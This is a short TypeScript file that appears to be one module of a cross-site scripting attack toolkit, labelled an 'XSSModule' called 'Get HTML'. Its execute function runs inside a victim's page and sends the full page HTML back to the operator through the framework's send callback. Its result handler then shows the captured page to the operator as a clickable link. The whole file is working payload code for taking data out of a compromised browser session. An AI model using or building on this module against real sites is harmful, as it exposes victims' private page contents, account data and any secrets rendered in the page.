import { XSSModule } from '../types/index.js';

export const getHtmlModule: XSSModule = {
  name: 'Get HTML',
  description: 'Gets the HTML of the page.',
  
  execute: (send) => {
    send(document.documentElement.outerHTML);
  },
  
  handleResult: (log, data) => {
    const blob = new Blob([data], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    log(`The HTML code is back! <a target="_blank" href="${url}">Click here</a> to read it.`, 'html');
  }
};

export default getHtmlModule;